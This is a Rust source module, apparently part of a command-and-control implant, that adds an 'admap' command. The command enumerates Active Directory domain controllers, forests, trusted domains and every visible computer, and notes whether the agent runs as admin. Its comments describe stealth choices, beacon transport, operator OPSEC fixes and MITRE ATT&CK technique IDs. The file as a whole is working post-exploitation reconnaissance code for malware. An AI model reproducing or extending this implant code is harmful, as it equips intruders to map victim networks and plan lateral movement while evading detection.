//! ad_map/mod.rs — AD / domain network discovery (v8, Phase E)
//!
//! WHAT: one inline command — `admap` — that maps the network the agent
//! lives in: domain/workgroup membership, domain controller(s), and every
//! computer visible to the Net* browsing services. The JSON it returns is
//! stored server-side (graph.go) and rendered by the GUI's AD Map graph
//! (ui/graph/AdMapWindow.java).
//!
//! HOW (all inline WinAPI, zero child processes):
//!   • DsGetDcNameA   → DC name/address/site + DNS domain + forest (T1018)
//!   • NetServerEnum(101, WORKSTATION|SERVER) → every machine in the
//!     domain/workgroup browse list, with role classification (T1482)
//!   • NetServerEnum(101, DOMAIN_ENUM) → trusted/adjacent domains
//!   • env (USERDNSDOMAIN/USERDOMAIN/COMPUTERNAME/USERNAME) + IsUserAnAdmin
//!     → the agent's own identity in the map.
//!
//! WORKGROUP SAFETY: on a non-domain machine DsGetDcNameA fails with
//! ERROR_NO_SUCH_DOMAIN — that is NOT an error for us; we degrade to
//! workgroup mode (domain=USERDOMAIN/WORKGROUP) and NetServerEnum(NULL)
//! still lists local-subnet servers. The map never comes back empty.
//!
//! STEALTH: NetServerEnum/DsGetDcName are the same calls Explorer/Office
//! make when opening a network location — documented API traffic only.

pub mod ffi;

use serde_json::{json, Value};

/// Cap the JSON response size — a 50k-machine forest is still reported via
/// `total`, but the wire payload stays bounded (task results ride the
/// encrypted beacon envelope).
const MAX_COMPUTERS_IN_RESPONSE: usize = 512;

/// Entry point — `admap` inline command. Returns (stdout_json, stderr).
pub fn run(_args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    {
        return (
            String::new(),
            "admap: windows-only recon (no AD browse services on this platform)".into(),
        );
    }

    #[cfg(target_os = "windows")]
    {
        run_windows()
    }
}

#[cfg(target_os = "windows")]
fn run_windows() -> (String, String) {
    use ffi::*;

    let mut api_errors: Vec<String> = Vec::new();

    // ── Agent identity (map origin node) ─────────────────────────────────
    let host = std::env::var("COMPUTERNAME").unwrap_or_default();
    let user = std::env::var("USERNAME").unwrap_or_default();
    let is_admin = unsafe { IsUserAnAdmin() != 0 };

    // ── Domain + DC discovery ────────────────────────────────────────────
    // DsGetDcNameA(NULL) → DC of our own domain. Workgroup → 1355, expected.
    let mut domain = String::new();
    let mut forest = String::new();
    let mut dc_json: Value = Value::Null;
    let mut workgroup = true;

    unsafe {
        let mut info: *mut DOMAIN_CONTROLLER_INFOA = std::ptr::null_mut();
        let rc = DsGetDcNameA(
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            0, // flags: cached DC info is fine (quiet, fast)
            &mut info,
        );
        if rc == 0 && !info.is_null() {
            let i = &*info;
            let dc_name = from_ansi(i.DomainControllerName);
            domain = from_ansi(i.DomainName);
            forest = from_ansi(i.DnsForestName);
            let dc_addr = from_ansi(i.DomainControllerAddress);
            let dc_site = from_ansi(i.DcSiteName);
            workgroup = false;
            if !dc_name.is_empty() || !dc_addr.is_empty() {
                dc_json = json!({
                    "name": dc_name.trim_start_matches('\\').to_string(),
                    "address": dc_addr,
                    "site": dc_site,
                    "forest": forest,
                });
            }
            NetApiBufferFree(info as *mut core::ffi::c_void);
        } else if rc != 1355 {
            // Anything other than "not domain-joined" is worth reporting,
            // but never fatal — the browse-list pass below may still work.
            api_errors.push(format!("DsGetDcName error {}", rc));
        }
    }

    if domain.is_empty() {
        // Workgroup path: USERDNSDOMAIN absent, USERDOMAIN = machine or domain
        domain = std::env::var("USERDNSDOMAIN")
            .or_else(|_| std::env::var("USERDOMAIN"))
            .unwrap_or_else(|_| "WORKGROUP".into());
    }
    workgroup = workgroup && domain.eq_ignore_ascii_case("WORKGROUP") ||
                std::env::var("USERDNSDOMAIN").is_err() && dc_json.is_null();

    // ── Browse list: every computer (workstations + servers) ─────────────
    let mut computers: Vec<Value> = Vec::new();
    let mut total = 0u32;
    match enum_servers(SV_TYPE_WORKSTATION | SV_TYPE_SERVER) {
        Ok((read, total_entries, items)) => {
            total = total_entries;
            for (name, typ, comment, major, minor) in items.iter().take(MAX_COMPUTERS_IN_RESPONSE) {
                computers.push(json!({
                    "name": name,
                    "type": classify(typ),
                    "comment": comment,
                    "version": format!("{}.{}", major, minor),
                }));
            }
            if total_entries as usize > MAX_COMPUTERS_IN_RESPONSE {
                api_errors.push(format!(
                    "truncated: showed {} of {} machines",
                    read.min(MAX_COMPUTERS_IN_RESPONSE as u32), total_entries
                ));
            }
        }
        Err(e) => api_errors.push(format!("NetServerEnum(workstations): {}", e)),
    }

    // ── Adjacent/trusted domains (SV_TYPE_DOMAIN_ENUM) ───────────────────
    let mut domains: Vec<String> = Vec::new();
    match enum_servers(SV_TYPE_DOMAIN_ENUM) {
        Ok((_, _, items)) => {
            for (name, _, _, _, _) in items {
                if !name.is_empty() && !domains.iter().any(|d| d.eq_ignore_ascii_case(&name)) {
                    domains.push(name);
                }
            }
        }
        Err(e) => api_errors.push(format!("NetServerEnum(domains): {}", e)),
    }

    let out = json!({
        "kind": "ad_map",
        "agent": format!("{}@{}", user, host),
        "domain": domain,
        "workgroup": workgroup,
        "dc": dc_json,
        "forest": forest,
        "domains": domains,
        "computers": computers,
        "total": total,
        "enumerated": computers.len(),
        "is_admin": is_admin,
        "error": api_errors.join("; "),
    });
    (serde_json::to_string(&out).unwrap_or_default(), String::new())
}

/// NetServerEnum level-101 wrapper → Vec<(name, type, comment, vmaj, vmin)>.
#[cfg(target_os = "windows")]
fn enum_servers(servertype: u32) -> Result<(u32, u32, Vec<(String, u32, String, u32, u32)>), String> {
    use ffi::*;
    unsafe {
        let mut buf: *mut u8 = std::ptr::null_mut();
        let mut read: u32 = 0;
        let mut total: u32 = 0;
        let rc = NetServerEnum(
            std::ptr::null(),
            101,
            &mut buf,
            MAX_PREFERRED_LENGTH,
            &mut read,
            &mut total,
            servertype,
            std::ptr::null(),
            std::ptr::null_mut(), // single-shot resume_handle=NULL (header-variant-proof)
        );
        if rc != 0 && rc != 234 {
            // OPSEC FIX (audit I-M8): rc=234 (ERROR_MORE_DATA) means the
            // buffer has `read` entries but more exist on the network.
            // Previously, rc=234 was treated as a failure → large domains
            // with many servers got an EMPTY admap because the function
            // returned "more data" instead of "success". Now we treat
            // rc=234 as partial success — process the `read` entries we
            // got. The `total` field tells the operator how many were
            // missed (total - read = truncated).
            return Err(format!("status {} ({}: browsing may be disabled)", rc,
                match rc { 5 => "access denied", 53 => "bad net path", 6118 => "no browse list",
                           _ => "see MS docs" }));
        }
        // rc == 0 (full success) or rc == 234 (partial — more data exists)
        // In both cases, `read` entries are valid and should be processed.
        let mut items = Vec::with_capacity(read as usize);
        let base = buf as *const SERVER_INFO_101;
        for i in 0..read as usize {
            let e = &*base.add(i);
            items.push((
                from_wide(e.sv101_name),
                e.sv101_type,
                from_wide(e.sv101_comment),
                e.sv101_version_major,
                e.sv101_version_minor,
            ));
        }
        NetApiBufferFree(buf as *mut core::ffi::c_void);
        Ok((read, total, items))
    }
}

/// Human role classification from the SV_TYPE_* mask.
#[cfg(target_os = "windows")]
fn classify(t: &u32) -> &'static str {
    use ffi::*;
    if t & SV_TYPE_DOMAIN_CTRL != 0 { "dc" }
    else if t & SV_TYPE_DOMAIN_BAKCTRL != 0 { "bdc" }
    else if t & SV_TYPE_SERVER != 0 { "server" }
    else if t & SV_TYPE_WORKSTATION != 0 { "workstation" }
    else { "other" }
}
